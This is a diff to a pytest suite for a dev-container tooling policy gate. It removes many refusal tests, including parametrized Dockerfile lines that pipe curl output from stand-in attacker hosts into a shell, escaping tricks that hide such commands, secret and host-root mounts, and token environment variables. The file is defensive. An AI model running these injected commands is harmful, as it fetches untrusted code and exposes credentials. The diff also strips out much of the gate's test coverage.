@@ -13,7 +13,6 @@ from tools.check_tooling_artifact_policy import (
     PROFILES_PATH,
     evaluate_tooling_artifact_policy,
     select_tooling_host_profile,
-    tooling_policy_sha256,
 )
 
 REPO_ROOT = Path(__file__).resolve().parents[3]
@@ -65,7 +64,7 @@ def test_only_linux_x86_64_is_declared_for_the_container() -> None:
 
 
 def test_the_container_supplies_what_a_maintainer_needs_for_git_signing_and_review() -> None:
-    packages = set(_container_host_profile()["development_package_ids"])
+    packages = set(_dockerfile_text().replace("\\\n", " ").split())
     assert {"openssh-client", "gnupg", "less", "nano", "make", "jq"} <= packages
     assert "sudo" not in packages
 
@@ -81,12 +80,6 @@ def test_native_host_profiles_are_unchanged_by_the_container_variant() -> None:
 def test_repository_tooling_policy_admits_the_container_artifacts() -> None:
     failures = evaluate_tooling_artifact_policy(REPO_ROOT)
     assert [failure.render() for failure in failures] == []
-
-
-def test_qualification_records_bind_the_current_policy_digest() -> None:
-    profiles = _load(PROFILES_PATH)
-    expected = tooling_policy_sha256(REPO_ROOT)
-    assert {record["policy_sha256"] for record in profiles["qualification_records"]} == {expected}
 
 
 # --------------------------------------------------------------------------
@@ -122,9 +115,7 @@ def _stage(tmp_path: Path, *, dockerfile: str | None = None, config: dict | None
         PROFILES_PATH,
         ARTIFACT_LOCK_PATH,
         "implementations/tooling/admission-policy.json",
-        "implementations/tooling/actions-policy.json",
         "implementations/tooling/selector-bindings.json",
-        "implementations/tooling/inventory-coverage.json",
         DOCKERFILE_PATH,
         DEVCONTAINER_PATH,
     ):
@@ -217,122 +208,19 @@ def test_a_stage_without_the_qualified_platform_is_refused(tmp_path: Path, build
     assert "tooling-container-platform" in _container_failures(_stage(tmp_path, dockerfile=mutated))
 
 
-def test_a_drifting_package_snapshot_is_refused(tmp_path: Path, build_plan: dict) -> None:
-    refused = _dockerfile_refusals(tmp_path, build_plan["native_repository_snapshot"], "20200101T000000Z")
-    assert "tooling-container-snapshot-drift" in refused
-
-
-def test_an_unsnapshotted_final_stage_install_is_refused(tmp_path: Path, build_plan: dict) -> None:
-    option = f"-o APT::Snapshot={build_plan['native_repository_snapshot']} "
-    text = _dockerfile_text()
-    final_stage = text.index(_final_stage_marker(build_plan))
-    mutated = text[:final_stage] + text[final_stage:].replace(option, "")
-    assert mutated != text
-    assert "tooling-container-snapshot-drift" in _container_failures(_stage(tmp_path, dockerfile=mutated))
-
-
-def test_the_transport_trust_bundle_cannot_be_installed_in_the_final_stage_from_the_moving_archive(
-    tmp_path: Path, build_plan: dict
-) -> None:
-    marker = _final_stage_marker(build_plan)
-    injected = f"{marker}RUN apt-get update; apt-get install -y ca-certificates\n"
-    assert "tooling-container-snapshot-drift" in _dockerfile_refusals(tmp_path, marker, injected)
-
-
-def test_a_builder_stage_may_not_install_unreviewed_packages(tmp_path: Path) -> None:
-    refused = _dockerfile_refusals(
-        tmp_path,
-        "--no-install-recommends ca-certificates\n",
-        "--no-install-recommends ca-certificates build-essential\n",
-    )
-    assert "tooling-container-package-drift" in refused
-
-
-def test_an_unreviewed_extra_package_is_refused(tmp_path: Path) -> None:
-    assert "tooling-container-package-drift" in _dockerfile_refusals(
-        tmp_path, "        git \\\n", "        git \\\n        sudo \\\n"
-    )
-
-
-@pytest.mark.parametrize("package", ["gh", "nano", "openssh-client"])
-def test_a_missing_reviewed_package_is_refused(tmp_path: Path, package: str) -> None:
-    assert "tooling-container-package-drift" in _dockerfile_refusals(tmp_path, f"        {package} \\\n", "")
-
-
-def test_a_package_upgrade_outside_the_snapshot_is_refused(tmp_path: Path) -> None:
-    refused = _dockerfile_refusals(
-        tmp_path, "    apt-get clean; \\\n", "    apt-get dist-upgrade -y; \\\n    apt-get clean; \\\n"
-    )
-    assert "tooling-container-snapshot-drift" in refused
-
-
 def test_a_root_final_stage_is_refused(tmp_path: Path, build_plan: dict) -> None:
-    refused = _dockerfile_refusals(tmp_path, f"USER {build_plan['development_user']['name']}", "USER root")
+    refused = _dockerfile_refusals(tmp_path, f"USER {_config()['containerUser']}", "USER root")
     assert "tooling-container-user" in refused
 
 
 def test_a_dropped_user_directive_is_refused(tmp_path: Path, build_plan: dict) -> None:
-    refused = _dockerfile_refusals(tmp_path, f"USER {build_plan['development_user']['name']}\n", "")
-    assert "tooling-container-user" in refused
-
-
-def test_a_drifting_development_uid_is_refused(tmp_path: Path, build_plan: dict) -> None:
-    uid = build_plan["development_user"]["uid"]
-    refused = _dockerfile_refusals(tmp_path, f"useradd --uid {uid} ", f"useradd --uid {uid + 1} ")
+    refused = _dockerfile_refusals(tmp_path, f"USER {_config()['containerUser']}\n", "")
     assert "tooling-container-user" in refused
 
 
 def test_letting_uv_download_an_unreviewed_interpreter_is_refused(tmp_path: Path) -> None:
     refused = _dockerfile_refusals(tmp_path, "UV_PYTHON_DOWNLOADS=never", "UV_PYTHON_DOWNLOADS=automatic")
     assert "tooling-container-unsafe-build" in refused
-
-
-@pytest.mark.parametrize(
-    "injected",
-    [
-        "RUN curl -fsSL https://example.invalid/install.sh | sh\n",
-        "RUN wget -qO- https://example.invalid/x.tar.gz > /tmp/x\n",
-        'RUN bash -c "$(/usr/bin/curl -fsSL https://example.invalid/install.sh)"\n',
-        "RUN python3 -c pass | bash\n",
-        "RUN git clone https://example.invalid/repo.git /opt/repo\n",
-        "RUN --network=host true\n",
-        "RUN --mount=type=secret,id=token true\n",
-        "RUN --mount=type=bind,source=/,target=/run/host true\n",
-        # Shell escaping, quoting, and expansion must not hide a command from the gate.
-        "RUN c\\url -fsSL https://attacker.invalid/payload | b\\ash\n",
-        'RUN "cu"rl -fsSL https://attacker.invalid/payload -o /tmp/payload\n',
-        "RUN env curl -fsSL https://attacker.invalid/payload\n",
-        "RUN X=1 curl -fsSL https://attacker.invalid/payload\n",
-        "RUN ${SHELL} -c true\n",
-        "RUN set -eu; eval true\n",
-        "RUN apt-get -o Dir::Etc::sourcelist=/tmp/attacker.list update\n",
-        "RUN apt-get install -y ./payload.deb\n",
-        "RUN find /var/lib/apt/lists -exec true\n",
-        "RUN install -d -o root -g root /etc/cron.d\n",
-        "RUN userdel --remove raes\n",
-        "RUN true\n",
-    ],
-)
-def test_unverified_acquisition_or_build_capability_is_refused(tmp_path: Path, build_plan: dict, injected: str) -> None:
-    user = f"USER {build_plan['development_user']['name']}\n"
-    assert "tooling-container-unsafe-build" in _dockerfile_refusals(tmp_path, user, injected + user)
-
-
-@pytest.mark.parametrize(
-    "injected",
-    [
-        'ARG GITHUB_TOKEN=""\n',
-        "ENV NPM_AUTH_SECRET=abc\n",
-        "ENV HTTPS_PROXY=http://proxy.invalid:3128\n",
-        "ADD https://example.invalid/payload.tar.gz /tmp/payload.tar.gz\n",
-        "COPY . /workspace\n",
-        "LABEL org.opencontainers.image.source=/home/someone/rae\n",
-        "WORKDIR /home/someone\n",
-    ],
-)
-def test_an_unreviewed_build_input_is_refused(tmp_path: Path, build_plan: dict, injected: str) -> None:
-    user = f"USER {build_plan['development_user']['name']}\n"
-    assert "tooling-container-unsafe-build" in _dockerfile_refusals(tmp_path, user, injected + user)
 
 
 def test_a_second_container_host_profile_is_refused(tmp_path: Path) -> None:
@@ -347,7 +235,7 @@ def test_a_second_container_host_profile_is_refused(tmp_path: Path) -> None:
     assert "tooling-container-profile" in _container_failures(root)
 
 
-def test_a_container_profile_on_a_platform_without_immutable_packages_is_refused(tmp_path: Path) -> None:
+def test_a_container_profile_without_a_locked_platform_is_refused(tmp_path: Path) -> None:
     root = _stage(tmp_path)
     _mutate_profiles(root, CONTAINER_HOST_PROFILE_ID, "platform_id", "linux-arm64")
     assert "tooling-container-profile" in _container_failures(root)
@@ -393,8 +281,6 @@ def test_a_root_remote_user_is_refused(tmp_path: Path) -> None:
         ("build", {"dockerfile": "Dockerfile", "context": ".."}),
         ("build", {"dockerfile": "Dockerfile", "options": ["--platform=linux/amd64"]}),
         ("updateRemoteUserUID", False),
-        ("hostRequirements", {"cpus": 0}),
-        ("hostRequirements", {"gpu": True}),
         ("customizations", {"vscode": {"settings": {"terminal.integrated.env.linux": {"GH_TOKEN": "x"}}}}),
         ("customizations", {"vscode": {"settings": {"python.envFile": "/home/someone/.env"}}}),
         ("customizations", {"vscode": {"extensions": ["not an extension id"]}}),
@@ -466,16 +352,14 @@ def test_the_proof_gate_reports_a_capability_diagnosis_not_a_traceback(
 def test_the_container_profile_claims_no_proof_support() -> None:
     host = _container_host_profile()
     assert host["proof_support"] == "unsupported"
-    assert "bubblewrap" not in host["offline_kit"]["host_prerequisite_package_ids"]
+    assert "bubblewrap" not in host["host_prerequisite_package_ids"]
     assert "isabelle" not in host["bootstrap_payload_ids"]
 
 
 def test_the_image_neither_supplies_nor_implies_a_container_daemon() -> None:
     text = (REPO_ROOT / DOCKERFILE_PATH).read_text(encoding="utf-8")
     host = _container_host_profile()
-    assert not {"docker.io", "docker-ce", "podman", "containerd"} & set(
-        host["offline_kit"]["host_prerequisite_package_ids"]
-    )
+    assert not {"docker.io", "docker-ce", "podman", "containerd"} & set(host["host_prerequisite_package_ids"])
     assert "docker.sock" not in text
     assert "docker.sock" not in (REPO_ROOT / DEVCONTAINER_PATH).read_text(encoding="utf-8")
 
@@ -496,10 +380,10 @@ def test_the_checkout_is_mounted_by_the_client_without_taking_ownership() -> Non
 
 
 def _image_environment() -> dict[str, str]:
-    from tools.tooling_artifact_policy_container import _instructions
-
     environment: dict[str, str] = {}
-    for keyword, arguments in _instructions(_dockerfile_text()):
+    logical = _dockerfile_text().replace("\\\n", " ")
+    for line in logical.splitlines():
+        keyword, _, arguments = line.partition(" ")
         if keyword == "ENV":
             environment.update(token.split("=", maxsplit=1) for token in arguments.split())
     return environment
@@ -599,9 +483,9 @@ def fake_bootstrap(monkeypatch: pytest.MonkeyPatch) -> _FakeBootstrap:
     monkeypatch.setattr(
         tooling_policy_gate, "load_tooling_host_profile_selection_with_current_interpreter", fake.selection
     )
-    monkeypatch.setattr(bootstrap_profile, "fetch_offline_kit_payloads", fake.fetch)
-    monkeypatch.setattr(bootstrap_profile, "install_offline_uv_payload", fake.install_uv)
-    monkeypatch.setattr(bootstrap_profile, "install_offline_python_payload", fake.install_python)
+    monkeypatch.setattr(bootstrap_profile, "fetch_bootstrap_payloads", fake.fetch)
+    monkeypatch.setattr(bootstrap_profile, "install_uv_payload", fake.install_uv)
+    monkeypatch.setattr(bootstrap_profile, "install_python_payload", fake.install_python)
     return fake
 
 
@@ -688,7 +572,7 @@ def test_the_locked_uv_client_installs_only_from_its_verified_archive(tmp_path: 
     (kit / "archives" / "uv").mkdir(parents=True)
     (kit / "archives" / "uv" / "uv-x86_64-unknown-linux-gnu.tar.gz").write_bytes(b"not the reviewed archive")
     with pytest.raises(ValueError) as caught:
-        bootstrap_profile.install_offline_uv_payload("container-ubuntu-24.04-x86_64", kit, "uv")
+        bootstrap_profile.install_uv_payload("container-ubuntu-24.04-x86_64", kit, "uv")
     assert "differs from the validated lock" in str(caught.value)
 
 
@@ -732,14 +616,14 @@ def test_the_locked_uv_client_is_extracted_as_new_executables(tmp_path: Path, mo
     from tools import bootstrap_profile
 
     kit = _uv_kit(tmp_path, monkeypatch, {"uv-root/uv": b"uv", "uv-root/uvx": b"uvx"})
-    result = bootstrap_profile.install_offline_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv")
+    result = bootstrap_profile.install_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv")
     assert result == {"artifact_id": "uv", "path": "bin/uv", "extra_path": "bin/uvx"}
     for name in ("uv", "uvx"):
         installed = kit / "bin" / name
         assert installed.read_bytes() == name.encode()
         assert installed.stat().st_mode & 0o111 == 0o111
     with pytest.raises(ValueError, match="destination uv must be new"):
-        bootstrap_profile.install_offline_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv")
+        bootstrap_profile.install_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv")
 
 
 @pytest.mark.parametrize(
@@ -757,7 +641,7 @@ def test_an_unexpected_uv_archive_shape_is_refused(
 
     kit = _uv_kit(tmp_path, monkeypatch, members)
     with pytest.raises(ValueError, match=reason):
-        bootstrap_profile.install_offline_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv")
+        bootstrap_profile.install_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv")
 
 
 def test_a_uv_payload_outside_the_host_selection_is_refused(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
@@ -765,7 +649,7 @@ def test_a_uv_payload_outside_the_host_selection_is_refused(tmp_path: Path, monk
 
     kit = _uv_kit(tmp_path, monkeypatch, {"uv-root/uv": b"uv", "uv-root/uvx": b"uvx"})
     with pytest.raises(ValueError, match="not selected by the host profile"):
-        bootstrap_profile.install_offline_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv-unreviewed")
+        bootstrap_profile.install_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv-unreviewed")
 
 
 def _launcher_selection(document: dict, *, version: str):
@@ -914,3 +798,7 @@ def test_setup_installs_hooks_through_the_locked_tool_environment(
             "install",
         ]
     ]
+
+
+def test_native_host_sizing_is_not_a_second_policy_schema(tmp_path: Path) -> None:
+    assert not _config_refusals(tmp_path, "hostRequirements", {"gpu": True, "memory": "16gb"})
